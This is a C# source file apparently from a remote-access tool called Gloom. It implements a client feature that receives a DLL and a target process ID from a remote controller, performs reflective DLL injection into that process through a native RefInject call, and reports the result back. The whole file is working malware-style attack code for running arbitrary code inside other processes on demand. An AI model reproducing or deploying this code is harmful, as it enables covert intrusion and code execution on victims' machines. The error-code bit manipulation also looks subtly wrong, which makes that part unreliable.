using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Gloom.Client.Features.Inject
{
	internal class InjectDll : FeatureBase
	{
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetProcessHeap();

		[DllImport("kernel32.dll")]
		private static extern IntPtr HeapAlloc(IntPtr hHeap, int dwFlags, int dwBytes);

		[DllImport("kernel32.dll")]
		private static extern IntPtr HeapFree(IntPtr hHeap, int dwFlags, IntPtr lpMem);

		[DllImport("Gloom.GloomLib.dll")]
		private static extern ulong RefInject(uint pid, [MarshalAs(UnmanagedType.LPStr)] string reflectiveLoaderName, int dllDataSize, IntPtr dllDataHeap, int dllEntryParameterSize, IntPtr dllEntryParameterHeap);

		public override Guid[] AcceptedOps => new Guid[] { OpCodes.DllInjectionRequest };

		public InjectDll(IMessageSender sender) : base(sender)
		{
		}

		public override async Task HandleAsync(Guid op, byte[] data)
		{
			if (op != OpCodes.DllInjectionRequest)
				return;
			var req = data.Deserialize<OpStructs.DllInjectionRequest>();
			var heap = HeapAlloc(GetProcessHeap(), 0, req.TheDll.Length);
			Marshal.Copy(req.TheDll, 0, heap, req.TheDll.Length);
			var result = RefInject((uint)req.TargetProcessId, req.ReflectiveLoaderProcName, req.TheDll.Length, heap, 0, IntPtr.Zero);
			HeapFree(GetProcessHeap(), 0, heap);
			await SendAsync(OpCodes.DllInjectionResult, new OpStructs.DllInjectionResponse
			{
				ErrorCode = (int)(result & 0xFFFFFFFF),
				GetLastError = (int)(result >> 16 & 0xFFFFFFFF)
			});
		}
	}
}
